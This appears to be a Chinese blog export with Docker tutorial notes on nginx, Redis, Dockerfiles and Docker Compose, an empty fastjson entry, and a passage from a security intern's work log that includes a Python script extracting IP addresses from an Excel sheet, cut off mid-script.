<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/root目录下创建nginx目录用于存储nginx数据信息</span></span><br><span class="line">mkdir ~/nginx</span><br><span class="line">cd ~/nginx</span><br><span class="line">mkdir conf</span><br><span class="line">cd conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span></span><br><span class="line">vim nginx.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user  nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log  /var/log/nginx/error.log warn;</span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       /etc/nginx/mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>




<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name=c_nginx \</span><br><span class="line">-p 80:80 \</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">-v $PWD/logs:/var/log/nginx \</span><br><span class="line">-v $PWD/html:/usr/share/nginx/html \</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure>

<ul>
<li>参数说明：<ul>
<li><strong>-p 80:80</strong>：将容器的 80端口映射到宿主机的 80 端口。</li>
<li><strong>-v $PWD&#x2F;conf&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</strong>：将主机当前目录下的 &#x2F;conf&#x2F;nginx.conf 挂载到容器的 :&#x2F;etc&#x2F;nginx&#x2F;nginx.conf。配置目录</li>
<li><strong>-v $PWD&#x2F;logs:&#x2F;var&#x2F;log&#x2F;nginx</strong>：将主机当前目录下的 logs 目录挂载到容器的&#x2F;var&#x2F;log&#x2F;nginx。日志目录</li>
</ul>
</li>
</ul>
<ol start="4">
<li><p>使用外部机器访问nginx</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142036233.png" alt="image-20230301142036233"></p>
</li>
</ol>
<h5 id="部署Redis"><a href="#部署Redis" class="headerlink" title="部署Redis"></a>部署Redis</h5><p>需求：在Docker容器中部署Redis，并通过外部机器访问Redis。</p>
<p>实现步骤 ① 搜索Redis镜像 ② 拉取Redis镜像 ③ 创建容器 ④ 测试访问</p>
<ol>
<li>搜索redis镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search redis</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取redis镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name=c_redis -p 6379:6379 redis:5.0</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>使用外部机器连接redis</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./redis-cli.exe -h 192.168.149.135 -p 6379</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142459588.png" alt="image-20230301142459588"></p>
<h3 id="5、Dockerfile"><a href="#5、Dockerfile" class="headerlink" title="5、Dockerfile"></a>5、Dockerfile</h3><h5 id="Docker镜像原理"><a href="#Docker镜像原理" class="headerlink" title="Docker镜像原理"></a>Docker镜像原理</h5><p>问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker 镜像本质是什么？</span><br><span class="line">Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class="line">Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br></pre></td></tr></table></figure>

<p>理论知识：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统组成部分：</span><br><span class="line">进程通信子系统</span><br><span class="line">内存管理子系统</span><br><span class="line">备管理子系统</span><br><span class="line">文件管理子系统</span><br><span class="line">网络通信子系统</span><br><span class="line">作业控制子系统</span><br><span class="line">进程调度子系统</span><br><span class="line"></span><br><span class="line">Linux文件系统由bootfs和rootfs两部分组成</span><br><span class="line">• bootfs：包含bootloader（引导加载程序）和 kernel（内核）</span><br><span class="line">• rootfs： root文件系统，包含的就是典型 Linux 系统中的/dev，/proc，/bin，/etc等标准目录和文件</span><br><span class="line">• 不同的linux发行版，bootfs基本一样，而rootfs不同，如ubuntu，centos等</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143313641.png" alt="image-20230301143313641" style="zoom:67%;" />

<p>问题回答：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Docker 镜像本质是什么？</span><br><span class="line">• 是一个分层文件系统</span><br><span class="line">2. Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class="line">• Centos的iso镜像文件包含bootfs和rootfs，而docker的centos镜像复用操作系统的bootfs，只有rootfs和其他镜像层</span><br><span class="line">3. Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br><span class="line">• 由于docker中镜像是分层的，tomcat虽然只有70多MB，但他需要依赖于父镜像和基础镜像，所有整个对外暴露的tomcat镜像大小500多MB</span><br></pre></td></tr></table></figure>

<p>docker inspect tomcat 效果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143908837.png" alt="image-20230301143908837"></p>
<h5 id="Docker镜像制作"><a href="#Docker镜像制作" class="headerlink" title="Docker镜像制作"></a>Docker镜像制作</h5><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301144055969.png" alt="image-20230301144055969" style="zoom:50%;" />

<p> 注意：</p>
<ol>
<li>自己制作镜像时，目录挂载不会生效，其它会保存</li>
</ol>
<h5 id="Dockerfile概念"><a href="#Dockerfile概念" class="headerlink" title="Dockerfile概念"></a>Dockerfile概念</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dockerfile 是一个文本文件 </span><br><span class="line">包含了一条条的指令 </span><br><span class="line">每一条指令构建一层，基于基础镜像，最终构建出一个新的镜像 </span><br><span class="line">对于开发人员：可以为开发团队提供一个完全一致的开发环境 </span><br><span class="line">对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件 构建一个新的镜像开始工作了 </span><br><span class="line">对于运维人员：在部署时，可以实现应用的无缝移</span><br></pre></td></tr></table></figure>

<p>参考网站：<a href="https://hub.docker.com/">https://hub.docker.com</a></p>
<h5 id="Dockerfile关键字"><a href="#Dockerfile关键字" class="headerlink" title="Dockerfile关键字"></a>Dockerfile关键字</h5><table>
<thead>
<tr>
<th>关键字</th>
<th>作用</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>FROM</td>
<td>指定父镜像</td>
<td>指定dockerfile基于那个image构建</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>作者信息</td>
<td>用来标明这个dockerfile谁写的</td>
</tr>
<tr>
<td>LABEL</td>
<td>标签</td>
<td>用来标明dockerfile的标签 可以使用Label代替Maintainer 最终都是在docker image基本信息中可以查看</td>
</tr>
<tr>
<td>RUN</td>
<td>执行命令</td>
<td>执行一段命令 默认是&#x2F;bin&#x2F;sh 格式: RUN command 或者 RUN [“command” , “param1”,”param2”]</td>
</tr>
<tr>
<td>CMD</td>
<td>容器启动命令</td>
<td>提供启动容器时候的默认命令 和ENTRYPOINT配合使用.格式 CMD command param1 param2 或者 CMD [“command” , “param1”,”param2”]</td>
</tr>
<tr>
<td>ENTRYPOINT</td>
<td>入口</td>
<td>一般在制作一些执行就关闭的容器中会使用</td>
</tr>
<tr>
<td>COPY</td>
<td>复制文件</td>
<td>build的时候复制文件到image中</td>
</tr>
<tr>
<td>ADD</td>
<td>添加文件</td>
<td>build的时候添加文件到image中 不仅仅局限于当前build上下文 可以来源于远程服务</td>
</tr>
<tr>
<td>ENV</td>
<td>环境变量</td>
<td>指定build时候的环境变量 可以在启动的容器的时候 通过-e覆盖 格式ENV name&#x3D;value</td>
</tr>
<tr>
<td>ARG</td>
<td>构建参数</td>
<td>构建参数 只在构建的时候使用的参数 如果有ENV 那么ENV的相同名字的值始终覆盖arg的参数</td>
</tr>
<tr>
<td>VOLUME</td>
<td>定义外部可以挂载的数据卷</td>
<td>指定build的image那些目录可以启动的时候挂载到文件系统中 启动容器的时候使用 -v 绑定 格式 VOLUME [“目录”]</td>
</tr>
<tr>
<td>EXPOSE</td>
<td>暴露端口</td>
<td>定义容器运行的时候监听的端口 启动容器的使用-p来绑定暴露端口 格式: EXPOSE 8080 或者 EXPOSE 8080&#x2F;udp</td>
</tr>
<tr>
<td>WORKDIR</td>
<td>工作目录</td>
<td>指定容器内部的工作目录 如果没有创建则自动创建 如果指定&#x2F; 使用的是绝对地址 如果不是&#x2F;开头那么是在上一条workdir的路径的相对路径</td>
</tr>
<tr>
<td>USER</td>
<td>指定执行用户</td>
<td>指定build或者启动的时候 用户 在RUN CMD ENTRYPONT执行的时候的用户</td>
</tr>
<tr>
<td>HEALTHCHECK</td>
<td>健康检查</td>
<td>指定监测当前容器的健康监测的命令 基本上没用 因为很多时候 应用本身有健康监测机制</td>
</tr>
<tr>
<td>ONBUILD</td>
<td>触发器</td>
<td>当存在ONBUILD关键字的镜像作为基础镜像的时候 当执行FROM完成之后 会执行 ONBUILD的命令 但是不影响当前镜像 用处也不怎么大</td>
</tr>
<tr>
<td>STOPSIGNAL</td>
<td>发送信号量到宿主机</td>
<td>该STOPSIGNAL指令设置将发送到容器的系统调用信号以退出。</td>
</tr>
<tr>
<td>SHELL</td>
<td>指定执行脚本的shell</td>
<td>指定RUN CMD ENTRYPOINT 执行命令的时候 使用的shell</td>
</tr>
</tbody></table>
<h5 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h5><p>需求：定义dockerfile，发布springboot项目</p>
<p>实现步骤 ① 定义父镜像：FROM java:8 ② 定义作者信息：MAINTAINER itheima  ③ 将jar包添加到容器： ADD springboot.jar app.jar ④ 定义容器启动执行的命令：CMD java–jar app.jar ⑤ 通过dockerfile构建镜像：docker bulid –f dockerfile文件路径 –t 镜像名称:版本</p>
<p>成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301152821606.png" alt="image-20230301152821606"></p>
<h5 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h5><p>需求：自定义centos7镜像。</p>
<p>要求：1.默认登录路经为&#x2F;usr 2.可以使用vim</p>
<p>dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> realikun404</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install -y vim</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /usr</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f dockerfile -t mycentos:1 .</span><br></pre></td></tr></table></figure>

<h3 id="6、Docker服务编排"><a href="#6、Docker服务编排" class="headerlink" title="6、Docker服务编排"></a>6、Docker服务编排</h3><h5 id="服务编排概念"><a href="#服务编排概念" class="headerlink" title="服务编排概念"></a>服务编排概念</h5><p>微服务架构的应用系统中一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停 ，维护的工作量会很大。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要从Dockerfile build image 或者去dockerhub拉取image </span><br><span class="line">要创建多个container </span><br><span class="line">要管理这些container（启动停止删除） </span><br></pre></td></tr></table></figure>

<p>服务编排： 按照一定的业务规则批量管理容器</p>
<h5 id="Docker-Compose概述"><a href="#Docker-Compose概述" class="headerlink" title="Docker Compose概述"></a>Docker Compose概述</h5><p>Docker Compose是一个编排多容器分布式部署的工具，提供命令集管理容器化应用的完整开发周期，包括服务构建 ，启动和停止。使用步骤：</p>
<ul>
<li><input disabled="" type="checkbox"> 利用 Dockerfile 定义运行环境镜像</li>
<li><input disabled="" type="checkbox"> 使用 docker-compose.yml 定义组成应用的各服务</li>
<li><input disabled="" type="checkbox"> 运行 docker-compose up 启动应用</li>
</ul>
<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><p>安装Docker Compose</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compose目前已经完全支持Linux、Mac OS和Windows，在我们安装Compose之前，需要先安装Docker。下面我 们以编译好的二进制包方式安装在Linux系统中。</span> </span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置文件可执行权限</span> </span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看版本信息</span> </span><br><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure>

<p>卸载Docker Compose</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二进制包方式安装的，删除二进制文件即可</span></span><br><span class="line">rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>



<p>使用docker compose编排nginx+springboot项目</p>
<ol>
<li>创建docker-compose目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ~/docker-compose</span><br><span class="line">cd ~/docker-compose</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>编写 docker-compose.yml 文件</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  nginx:</span><br><span class="line">   image: nginx</span><br><span class="line">   ports:</span><br><span class="line">    - <span class="number">80</span>:<span class="number">80</span></span><br><span class="line">   links:</span><br><span class="line">    - app</span><br><span class="line">   volumes:</span><br><span class="line">    - ./nginx/conf.d:/etc/nginx/conf.d</span><br><span class="line">  app:</span><br><span class="line">    image: app</span><br><span class="line">    <span class="keyword">expose</span>:</span><br><span class="line">      - <span class="string">&quot;8080&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建.&#x2F;nginx&#x2F;conf.d目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ./nginx/conf.d</span><br></pre></td></tr></table></figure>



<ol start="4">
<li>在.&#x2F;nginx&#x2F;conf.d目录下 编写itheima.conf文件</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    access_log off;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://app:8080;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>在~&#x2F;docker-compose 目录下 使用docker-compose 启动容器</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>测试访问</li>
</ol>
<h3 id="7、私有镜像"><a href="#7、私有镜像" class="headerlink" title="7、私有镜像"></a>7、私有镜像</h3><p>略</p>
<h3 id="8、Docker容器虚拟化与传统虚拟机相比"><a href="#8、Docker容器虚拟化与传统虚拟机相比" class="headerlink" title="8、Docker容器虚拟化与传统虚拟机相比"></a>8、Docker容器虚拟化与传统虚拟机相比</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161119318.png" alt="image-20230301161119318"></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161129373.png" alt="image-20230301161129373"></p>
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson分析</title>
    <url>/2023/05/23/fastjson%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>java fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>internship_record</title>
    <url>/2023/03/14/internship-record/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="安恒"><a href="#安恒" class="headerlink" title="安恒"></a>安恒</h1><h2 id="三月"><a href="#三月" class="headerlink" title="三月"></a>三月</h2><h3 id="15日"><a href="#15日" class="headerlink" title="15日"></a>15日</h3><p>summary：第一天入职 了解了请假、补假的流程，对工作稍微有了些数。对保密有了一定的了解。</p>
<table>
<thead>
<tr>
<th align="center">事情</th>
<th align="center">完成情况</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">url跳转漏洞验证+报告</td>
<td align="center">共写22条报告</td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="17日"><a href="#17日" class="headerlink" title="17日"></a>17日</h3><p>进行漏洞种类的看</p>
<p>下面写下看到的漏洞及等级</p>
<p>summary：找到了两个低危，以及进行学习，处理报告</p>
<p>对漏洞进行了整理，在常见漏洞里面</p>
<h3 id="20日"><a href="#20日" class="headerlink" title="20日"></a>20日</h3><p>summary:找到二个中危（表单无限制提交、密码爆破）、二个低危（敏感信息泄露）、对内网资产进行整合共整合IP10894条</p>
<p>下面是今天写的IP资产整合的代码，代码挺丑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;1.xlsx&#x27;</span>)</span><br><span class="line"><span class="comment"># print(df.describe())</span></span><br><span class="line">columns = df.columns.values.tolist()  <span class="comment">### 获取excel 表头 ，第一行</span></span><br><span class="line"><span class="comment"># res=[]</span></span><br><span class="line">myfile = <span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip_identify1</span>(<span class="params">ip</span>):  <span class="comment"># 192.168.1.1</span></span><br><span class="line">    result = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iplist = ip.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(iplist) == <span class="number">4</span>:</span><br><span class="line">            check_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> iplist:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (<span class="built_in">int</span>(i) &lt;= <span class="number">255</span> <span class="keyword">and</span> <span class="built_in">int</span>(i) &gt;= <span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    check_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> check_count == <span class="number">4</span>: result = <span class="literal">True</span>  <span class="comment"># ip</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip_identify2</span>(<span class="params">ip</span>):  <span class="comment"># 192.168.1.2-13</span></span><br><span class="line">    result = <span class="literal">False</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iplist = ip.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        checkCount = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(iplist) == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">255</span> &gt;= <span class="built_in">int</span>(iplist[i]) &gt;= <span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    checkCount += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 处理有-的</span></span><br><span class="line">            _numcount = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> iplist[<span class="number">3</span>]:</span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&quot;-&quot;</span> <span class="keyword">or</span> (<span class="built_in">int</span>(j) &lt;= <span class="number">255</span> <span class="keyword">and</span> <span class="built_in">int</span>(j) &gt;= <span class="number">0</span>) :</span><br><span class="line">                    <span class="keyword">if</span> j == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">                        _numcount += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> _numcount == <span class="number">1</span>:</span><br><span class="line">                _index = iplist[<span class="number">3</span>].find(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                start = iplist[<span class="number">3</span>][:_index]</span><br><span class="line">                end = iplist[<span class="number">3</span>][_index + <span class="number">1</span>:]</span><br><span class="line">                checkCount += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> checkCount == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> start&gt;end:</span><br><span class="line">                temp=end</span><br><span class="line">                end=start</span><br><span class="line">                start=temp</span><br><span class="line">            <span class="keyword">return</span> iplist[<span class="number">0</span>] + <span class="string">&quot;.&quot;</span> + iplist[<span class="number">1</span>] + <span class="string">&quot;.&quot;</span> + iplist[<span class="number">2</span>] + <span class="string">&quot;.&quot;</span>, start, end</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> idx, row <span class="keyword">in</span> df.iterrows():  <span class="comment">### 迭代数据 以键值对的形式 获取 每行的数据</span></span><br><span class="line">    <span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">        <span class="comment"># print(row[column])</span></span><br><span class="line">        curstr = row[column]</span><br><span class="line">        <span class="keyword">if</span> pd.isna(curstr):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            strlen = <span class="built_in">len</span>(curstr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">7</span></span><br><span class="line">        <span class="keyword">if</span> j &gt; strlen:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, strlen + <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, j):</span><br><span class="line">                tempstr = curstr[i:j]</span><br><span class="line">                <span class="comment"># 分成两种进行判断要么是类型一要么是类型二</span></span><br><span class="line">                <span class="keyword">if</span> ip_identify1(tempstr):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>.isdigit(curstr[j - <span class="number">1</span>]):</span><br><span class="line">                        <span class="keyword">if</span> (j != strlen <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">str</span>.isdigit(curstr[j])) <span class="keyword">or</span> j == strlen:<span class="comment">#j后面不能有数字，i前面也不能有数字</span></span><br><span class="line">                            <span class="keyword">if</span> i&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="built_in">str</span>.isdigit(curstr[i-<span class="number">1</span>]):</span><br><span class="line">                                <span class="keyword">continue</span></span><br><span class="line">                            <span class="keyword">if</span> (ip_identify1(tempstr)):</span><br><span class="line">                                <span class="comment"># res.append(tempstr)</span></span><br><span class="line">                                myfile.write(tempstr + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                            ipres = ip_identify2(tempstr)</span><br><span class="line">                            <span class="keyword">if</span> (ipres):</span><br><span class="line">                                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(ipres[<span class="number">1</span>]), <span class="built_in">int</span>(ipres[<span class="number">2</span>]) + <span class="number">1</span>):</span><br><span class="line">                                    <span class="keyword">try</span>:</span><br><span class="line">                                        myfile.write(tempstr + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                                        <span class="comment"># res.append(ipres[0] + str(k))</span></span><br><span class="line">                                    <span class="keyword">except</span>:</span><br><span class="line">                                        <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ipres = ip_identify2(tempstr)</span><br><span class="line">                    <span class="keyword">if</span> j&lt;strlen-<span class="number">1</span> <span class="keyword">and</span> <span class="built_in">str</span>.isdigit(curstr[j]):  <span class="comment"># j后面不能有数字，i前面也不能有数字</span></span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">str</span>.isdigit(curstr[i - <span class="number">1</span>]):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> (ipres):</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(ipres[<span class="number">1</span>]), <span class="built_in">int</span>(ipres[<span class="number">2</span>]) + <span class="number">1</span>):</span><br><span class="line">                                <span class="keyword">try</span>:</span><br><span class="line">                                    myfile.write(ipres[<span class="number">0</span>]+<span class="built_in">str</span>(k) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                                    <span class="comment"># res.append(ipres[0] + str(k))</span></span><br><span class="line">                                <span class="keyword">except</span>:</span><br><span class="line">                                    <span class="keyword">pass</span></span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>更新：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">df = pd.read_excel(<span class="string">&#x27;1.xlsx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">columns = df.columns.values.tolist()  <span class="comment">### 获取excel 表头 ，第一行</span></span><br><span class="line"><span class="comment"># res=[]</span></span><br><span class="line">myfile = <span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">patter1 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d)&#x27;</span>)</span><br><span class="line">patter2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d-25[0-5]|2[0-4]\d|[&#x27;</span></span><br><span class="line">                     <span class="string">r&#x27;0-1]\d&#123;2&#125;|[1-9]?\d)-(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, row <span class="keyword">in</span> df.iterrows():  <span class="comment">### 迭代数据 以键值对的形式 获取 每行的数据</span></span><br><span class="line">    